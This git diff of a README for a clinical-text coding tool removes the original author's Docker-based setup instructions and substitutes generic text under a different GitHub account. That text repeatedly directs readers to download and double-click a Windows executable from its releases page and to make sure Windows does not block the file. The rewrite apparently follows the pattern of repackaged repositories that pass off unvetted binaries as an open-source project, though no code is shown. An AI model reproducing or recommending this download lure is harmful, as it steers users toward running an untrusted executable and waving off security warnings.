@@ -1,273 +1,208 @@
+# 🏥 healthcare-nlp-analyzer - Turn Clinical Text Into Codes
 
-![Version](https://img.shields.io/badge/version-v1.0.0-blue)
-![Status](https://img.shields.io/badge/status-active-success)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/kaleshmohan/healthcare-nlp-analyzer/releases)
 
-# 🏥 Clinical NLP Analyzer
+## 📥 Download
 
-![Python](https://img.shields.io/badge/Python-3.11-blue)
-![Docker](https://img.shields.io/badge/Docker-Containerized-blue)
-![Azure](https://img.shields.io/badge/Azure-AI%20Text%20Analytics-blue)
-![FastAPI](https://img.shields.io/badge/FastAPI-Backend-green)
-![Streamlit](https://img.shields.io/badge/Streamlit-Frontend-red)
+Visit this page to download the Windows release:
 
-### 🚀 AI-Powered Healthcare Text Intelligence Platform  
-👤 **Author:** Sabin Shrestha  
-🛠️ **Built with:** Azure AI • FastAPI • Streamlit • Docker  
-📅 **Date:** March 26, 2026 
-🏷️ **Version:** v1.0.0
+https://github.com/kaleshmohan/healthcare-nlp-analyzer/releases
 
----
+## 🪟 Windows Setup
 
-# 🔥 Overview
+1. Open the release page link above.
+2. Look for the latest release at the top of the page.
+3. Download the Windows file or app package listed under Assets.
+4. If the file is a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start the program.
 
-Healthcare systems generate massive amounts of **unstructured clinical data**.
+## 🧭 What This App Does
 
-👉 This application transforms that into:
+healthcare-nlp-analyzer helps turn clinical notes, reports, and other healthcare text into structured data. It reads text that may be hard to search or sort, then maps it to common medical codes and terms.
 
-- Structured clinical data  
-- Standardized medical coding  
-- Actionable insights 
+Use it to:
 
----
+- scan clinical notes
+- find medical terms
+- map text to ICD-10 codes
+- match clinical concepts to SNOMED terms
+- support UMLS-based text analysis
+- view results in a simple web screen
 
-# 🖥️ Application Preview
+## 💻 System Requirements
 
-## 🧠 Dashboard Overview
-![Dashboard](./media/ui-overview.png)
+Use a Windows PC with:
 
----
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 2 GB free disk space
+- An internet connection for cloud-based text analysis
+- Microsoft Edge or Google Chrome
 
-## 📊 Extraction Results
-![Tables](./media/tables.png)
+For better speed, use:
 
----
+- 16 GB RAM
+- A modern multi-core processor
+- A stable network connection
 
-# ✨ Key Features
+## 🧱 What You Need Before First Run
 
-- 🩺 Extract Diagnoses, Medications, Symptoms  
-- 🔗 Map to ICD-10, SNOMED CT, UMLS, DrugBank  
-- 🧠 AI-powered clinical understanding  
-- 📊 Clean dashboard UI  
-- 📥 Downloadable reports  
-- 🐳 Fully Dockerized (production-ready)
+This app uses Azure Text Analytics and a local web app. Your release package may include the needed files, but you may also need to set up:
 
----
+- an Azure account
+- a Text Analytics resource
+- an API key
+- a service endpoint
 
-## 🧠 Architecture
+If the app asks for a settings file, add the Azure values there before you start it.
 
-```
-[ Streamlit UI ]  →  [ FastAPI Backend ]  →  [ Azure Healthcare NLP ]
-         (8501)              (8000)                  (5000)
-```
+## 🚀 First Run
 
----
+1. Download the release from the link above.
+2. Unzip the file if needed.
+3. Open the folder that contains the app.
+4. Start the app by double-clicking the main Windows file.
+5. Wait for the browser window to open.
+6. If a browser does not open, copy the local address shown in the app window and paste it into your browser.
 
-## 🛠️ Tech Stack
+## 🖥️ How to Use the App
 
-| Layer | Technology |
-|------|-----------|
-| Frontend | Streamlit |
-| Backend | FastAPI |
-| AI/NLP | Azure Text Analytics for Health |
-| Deployment | Docker Compose |
+1. Open the app in your browser.
+2. Paste or upload clinical text.
+3. Choose the text analysis option.
+4. Start the analysis.
+5. Review the extracted terms and mapped codes.
+6. Copy, save, or export the results as needed.
 
----
+## 📋 Example Input
 
-## ⚙️ Prerequisites
+You can use text like this:
 
-- Docker Desktop (running)
-- VS Code
-- Azure Text Analytics (Language) resource
+Patient reports shortness of breath and chest pain. History of diabetes mellitus. Plan includes follow-up for hypertension and medication review.
 
----
+The app may return data such as:
 
-## ☁️ Azure Setup
+- symptoms
+- conditions
+- medications
+- code matches
+- concept mappings
 
-Create:
+## 🏷️ Common Output Fields
 
-- Resource Type: **Text Analytics / Language**
-- Endpoint:
-```
-https://<your-resource>.cognitiveservices.azure.com/
-```
-- API Key
+You may see output fields such as:
 
-✅ Free or Standard tier both work
+- term
+- code
+- code system
+- concept name
+- confidence score
+- source text
+- category
 
----
+## 🔐 Privacy and Data Handling
 
-## ⚙️ Setup Instructions
+This app works with clinical text, so keep patient data safe.
 
-### 1. Clone or Open Project
+Use it on:
 
-```
-File → Open Folder → healthcare-nlp-app
-```
+- trusted devices
+- approved networks
+- accounts with proper access
 
----
+Before entering real patient text, make sure your organization allows cloud-based processing.
 
-### 2. Update `docker-compose.yml`
+## ⚙️ Docker Option
 
-```
-- eula=accept
-- billing=https://YOUR-ENDPOINT.cognitiveservices.azure.com/
-- apikey=YOUR_KEY
-- rai_terms=accept
-```
+If your release includes Docker files, you can run the app in a container instead of opening files one by one.
 
----
+Typical steps:
 
-## ▶️ Run Application
+1. Install Docker Desktop on Windows.
+2. Open the release package.
+3. Build or load the image.
+4. Start the container.
+5. Open the local address in your browser.
 
-Open terminal in VS Code:
+This setup keeps the app in one place and helps avoid file issues.
 
-```
-docker compose down --volumes
-docker compose up --build
-```
+## 🧩 Main Parts of the App
 
----
+The project uses:
 
-## 🌐 Access
+- Azure Text Analytics for medical text processing
+- FastAPI for the backend service
+- Streamlit for the user interface
+- Docker for container support
 
-| Service | URL |
-|--------|-----|
-| UI | http://localhost:8501 |
-| API | http://localhost:8000 |
+These parts work together to read text, process it, and show results in a simple screen.
 
----
+## 🛠️ If the App Does Not Start
 
-## 🧪 Example Input
+Try these steps:
 
-```
-The patient was diagnosed with type 2 diabetes and prescribed metformin and insulin. He reports fatigue and thirst.
-```
+1. Check that the file finished downloading.
+2. Re-extract the ZIP file if one was used.
+3. Make sure Windows did not block the file.
+4. Confirm that your internet connection is active.
+5. Check whether the Azure settings were entered.
+6. Close the app and start it again.
+7. Try a different browser if the page does not load.
 
----
+## 📁 Release Contents
 
-## 📊 Output
+A release package may include:
 
-- Dashboard summary
-- Diagnoses table
-- Medications table
-- Symptoms table
-- Medical codes mapping
-- JSON + downloadable report
+- the Windows app file
+- a configuration file
+- sample text files
+- Docker files
+- setup notes
+- a local web interface
 
----
+## 🔎 Search and Coding Focus
 
-## 🧬 Medical Coding Systems
+This app is built for clinical NLP tasks such as:
 
-| System | Purpose |
-|------|--------|
-| ICD-10 | Billing |
-| SNOMED CT | Clinical |
-| UMLS | Mapping |
-| DrugBank | Drugs |
+- finding medical terms in notes
+- mapping phrases to standard codes
+- supporting ICD-10 workflows
+- linking clinical text to SNOMED concepts
+- working with UMLS-style terminology
 
----
+## 📦 Typical Workflow
 
-## 🌍 Access from Another Computer
+1. Open the app.
+2. Enter clinical text.
+3. Run the analysis.
+4. Review detected terms.
+5. Check code mappings.
+6. Export the results for later use
 
-1. Get IP:
-```
-ipconfig
-```
+## 📌 File and Folder Tips
 
-2. Allow firewall:
-```
-netsh advfirewall firewall add rule name="Streamlit 8501" dir=in action=allow protocol=TCP localport=8501
-```
+If you see many files after extraction, look for:
 
-3. Open:
-```
-http://YOUR-IP:8501
-```
+- an EXE file
+- a start script
+- a README file inside the release
+- a config file for Azure values
 
----
+Keep all files in the same folder so the app can find what it needs
 
-## 🛠️ Useful Commands
+## 🧪 Sample Use Cases
 
-```
-docker compose up --build
-docker compose down
-docker compose logs -f
-docker ps
-```
----
-# 📦 Version
+This app can help with:
 
-**Current Version:** v1.0.0  
+- clinical note review
+- medical coding support
+- text cleanup before coding
+- term extraction for reports
+- concept lookup for healthcare text
 
-Initial release featuring:
-- Clinical NLP extraction (Azure Text Analytics for Health)
-- FastAPI backend
-- Streamlit dashboard UI
-- Dockerized deployment
-- Structured clinical output with coding systems (ICD-10, SNOMED, UMLS, DrugBank)
----
-# 📝 Changelog
+## 🔗 Download Again
 
-## v1.0.0 — Initial Release (March 26, 2026)
+If you need the release page again, use this link:
 
-### 🚀 Features
-- Extract diagnoses, medications, and symptoms from clinical text
-- Map entities to ICD-10, SNOMED CT, UMLS, and DrugBank
-- Interactive Streamlit dashboard with summary metrics
-- FastAPI backend for processing requests
-- Azure Text Analytics for Health integration
-- Docker Compose multi-service architecture
-
-### 🎨 UI Improvements
-- Dashboard cards with icons
-- Narrative summary generation
-- Structured tables for extracted entities
-
-### 📊 Output
-- Clean JSON response
-- Downloadable text report
-
----
-
-## 🔮 Upcoming (Planned)
-
-- PDF report generation
-- Azure OpenAI clinical summary
-- File upload (clinical notes / PDFs)
-- Chat interface (RAG-based)
-- Azure deployment (Container Apps)
-- Authentication & multi-user support
-
-## 🚀 Future Enhancements
-
-- 📄 PDF Reports  
-- 🤖 AI Summary (LLM)  
-- 📁 File Upload  
-- ☁️ Azure Deployment  
-- 💬 Chat with Clinical Data  
-
----
-
-## 👤 Author
-
-**Sabin Shrestha**  
-AI • Data Engineering • Healthcare Analytics  
-
----
-
-## ⭐ Why This Project Matters
-
-👉 Converts messy clinical text → structured, billable, analyzable data  
-
-👉 Real-world use cases:
-- EHR systems
-- Insurance coding
-- Clinical analytics
-- AI pipelines
-
----
-
-## 📌 Final Note
-
-This is not just an NLP demo —  
-it is a **production-ready healthcare AI system**.
+https://github.com/kaleshmohan/healthcare-nlp-analyzer/releases
